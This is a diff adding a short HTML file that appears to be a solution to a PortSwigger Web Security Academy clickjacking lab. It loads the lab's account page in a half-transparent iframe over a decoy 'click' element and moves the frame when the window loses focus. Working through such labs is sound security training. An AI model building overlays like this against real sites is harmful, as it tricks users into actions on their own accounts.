@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <style>
+    #target_website {
+      position: relative;
+      width: 500px;
+      height: 700px;
+      opacity: 0.5;
+      z-index: 2;
+    }
+
+    #decoy_website {
+      position: absolute;
+      top: 500px;
+      left: 60px;
+      z-index: 1;
+    }
+  </style>
+</head>
+
+<body>
+  <div id="decoy_website">
+    click
+  </div>
+  <iframe src="https://0ab1008b0435082f80c6446c00e50041.web-security-academy.net/my-account"
+    id="target_website"></iframe>
+  <script>
+    window.addEventListener('blur', () => {
+        const frame = document.querySelector("#target_website");
+        frame.style.top = "200px";
+        frame.style.left = "-140px";
+    });
+  </script>
+</body>
+
+</html>
